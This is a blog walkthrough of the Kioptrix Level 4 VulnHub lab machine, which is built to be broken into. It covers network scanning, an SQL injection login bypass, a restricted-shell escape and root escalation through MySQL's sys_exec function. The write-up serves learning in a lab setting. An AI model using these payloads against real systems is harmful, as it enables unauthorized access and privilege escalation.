---
layout: post
title: "Kioptrix Level 4"
date: 2022-03-05
categories: [VulnHub]
tags: [boot2root]
image: ../../assets/img/posts/Kioptrix-level-4.png

---

## Description

This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges. 

|**Box**|[Kioptrix Level 4](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[Kioptrix](https://www.vulnhub.com/author/kioptrix,8/)|

---

We'll start with first discovering the IP address of the box using **netdiscover** tool,

```bash
sudo netdiscover -r 10.0.2.0/24
```

![image](https://user-images.githubusercontent.com/67465230/156876091-8a7d29f5-477a-4f01-ac56-c3c92b95e31d.png)

Okay, so the IP address of the box is 10.0.2.71.

Now, let's start port scanning with nmap,

```bash
sudo nmap -A -T4 -p- -oN nmap_scan 10.0.2.71
```

![image](https://user-images.githubusercontent.com/67465230/156876096-599dedca-a8c7-40af-8bdb-d4a171e8f104.png)

we can see that there are 3 ports open 22(SSH), 80(http), 139,445(SMB).

Okay, we got SMB service running on this machine, so let's enumerate all users with nmap's smb-enum-users script,

```bash
sudo nmap -sC --script=smb-enum-users 10.0.2.71 -oN nmap_smb-users
```

![image](https://user-images.githubusercontent.com/67465230/156876105-12fc31b4-ae7e-4c04-b4d1-fe65fa3f9444.png)

we got John User.

Let's check what technologies are running on website,

```bash
whatweb http://10.0.2.71
```

![image](https://user-images.githubusercontent.com/67465230/156876115-e37ff5a5-a13f-4647-ac5b-f64df1e05eca.png)

It has password field that means there's a login page as well. Great!!

Let's visit http://10.0.2.71,

![image](https://user-images.githubusercontent.com/67465230/156876126-04ccfa62-f079-45cb-b556-d64cf4c12676.png)

we got login page. Since this box has login mechanism then chances are MySQL service might be running as well ( hopefully it does :) ) and this box is vulnerable to SQLi. So let's try to login using structured query,

providing `username=john and password=1' or 1=1#`,

![image](https://user-images.githubusercontent.com/67465230/156876135-0c585504-8c85-44dc-917b-f28587240919.png)

now press login button,

we got in as john user and there we got login creds (SSH ? let's see! ),

![image](https://user-images.githubusercontent.com/67465230/156876148-0c85aacf-c153-4603-b71c-d03d9b0a62eb.png)

Let's ssh using these creds,

```bash
ssh john@10.0.2.71
```

![image](https://user-images.githubusercontent.com/67465230/156876153-b9600342-7f69-4d57-9f0c-df0cb3ebde6d.png)

we got shell!!

let's Identify who we are,

```bash
whoami
id
```

![image](https://user-images.githubusercontent.com/67465230/156876160-1bda5222-e187-4caa-a7a0-5e2a672d77af.png)

Huh?? command won't work? let's try other commands.

try to change directory with cd command,

![image](https://user-images.githubusercontent.com/67465230/156876165-2bd7ed92-93d3-4589-8126-3f791f85e2f7.png)

We got warning and looks like if we type one more command then system will throw us out!! It throws me like trash for few times XD. But why? maybe we have under privilege shell. Let's see what commands we can run,

```bash
help
```

![image](https://user-images.githubusercontent.com/67465230/156876199-8fb87519-84f6-4845-a96d-461b777fd4d4.png)

seems like aren't much commands we can run but there echo command seems great friend to us right now. Let's use it to gain a fully functional shell,

```bash
echo os.system("/bin/bash")
```

![image](https://user-images.githubusercontent.com/67465230/156876203-e6260649-e468-4064-8479-f57a995dfc07.png)

we can now identify who we are with whoami command.

Now, that we got access as John user, now we'll move towards Privilege Escalation. For that, do ENUMERATION!!

After some enumeration, I found a file named checklogin.php in /var/www directory. let's view the content of file,

```bash
cat checklogin.php
```

![image](https://user-images.githubusercontent.com/67465230/156876215-fa0ea7f2-655b-401c-947b-59e43e2c57e8.png)

As you can see that, there is no password, so you can easily bypass MYSQL with UDF, [command-execution-with-mysql-udf](https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html), means we can escalate our privileges to root!

But before to proceed, let's check whether MySQL service is running with root privileges or not by typing the following command:

```bash
ls -la /user/lib/lib_mysqludf_sys.so
```

![image](https://user-images.githubusercontent.com/67465230/156876228-4ac8649b-a315-47e1-b97b-c6bc4d65525b.png)

Yes, mysql service is running so now, let's connect to mysql database with mysql client.

```bash
mysql -h localhost -u root -p
```

![image](https://user-images.githubusercontent.com/67465230/156876238-74c32a12-eb2d-4807-9e71-df25fdbf6332.png)

show databases; will give you a list of all databases.

Let's run a usermod command with sys_exec to give john admin privileges,

```bash
select sys_exec("usermod -a -G admin john"); exit
```

![image](https://user-images.githubusercontent.com/67465230/156876245-1e4e112f-789c-42d5-bd3c-cf23bddd7c1d.png)

This will add john to admin group and we'll take exit.

Now, let's switch to superuser,

```bash
sudo su
```

![image](https://user-images.githubusercontent.com/67465230/156876266-6021fbd0-bcb8-4407-a746-52f3e1b2b8bd.png)

by providing the password we found after exploiting login mechanism of machine using SQLi, we got system access and we confirmed it using id command.

navigating to /root directory and establish all directory content with ls,

![image](https://user-images.githubusercontent.com/67465230/156876271-4e9bef95-5c01-4e14-82d1-f4c1ea3dbcbb.png)

we got root flag. Let's view the content of it,

```bash
cat congrats.txt
```

![image](https://user-images.githubusercontent.com/67465230/156876296-f852ebbb-0363-4cf0-9061-725ff84e4dd1.png)

We've successfully rooted this machine.